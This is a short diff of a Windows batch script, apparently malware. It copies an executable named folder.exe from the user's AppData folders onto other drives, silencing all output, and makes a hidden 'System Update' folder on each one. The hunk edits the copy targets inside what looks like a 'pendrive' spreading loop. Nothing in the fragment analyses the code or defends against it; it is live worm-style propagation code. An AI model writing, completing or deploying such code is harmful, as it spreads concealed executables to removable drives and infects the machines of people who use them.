@@ -258,12 +258,12 @@ echo *************DOWNLOAD file****************
 	if %%l equ 2 (
 	mkdir %%i\Appdata > nul 2> nul
 	if exist "C:\Users\%username%\AppData\Roaming\folder.exe" (
-	copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i" /Y > nul 2> nul
-	copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\Appdata" /Y > nul 2> nul
+	copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\folder.exe" /Y > nul 2> nul
+	copy "C:\Users\%username%\AppData\Roaming\folder.exe" "%%i\Appdata\folder.exe" /Y > nul 2> nul
 	)
 	if exist "C:\Users\%username%\AppData\Local\0101\folder.exe" (
-	copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i" /Y > nul 2> nul
-	copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\Appdata" /Y > nul 2> nul
+	copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\folder.exe" /Y > nul 2> nul
+	copy "C:\Users\%username%\AppData\Local\0101\folder.exe" "%%i\Appdata\folder.exe" /Y > nul 2> nul
 	)
 	mkdir "%%i\System Update" > nul 2> nul
 	attrib +h "%%i\System Update" /s /d
@@ -275,6 +275,7 @@ echo *************DOWNLOAD file****************
 	echo.
 	cls
 	goto pendrive
+	
 	
 
 exit
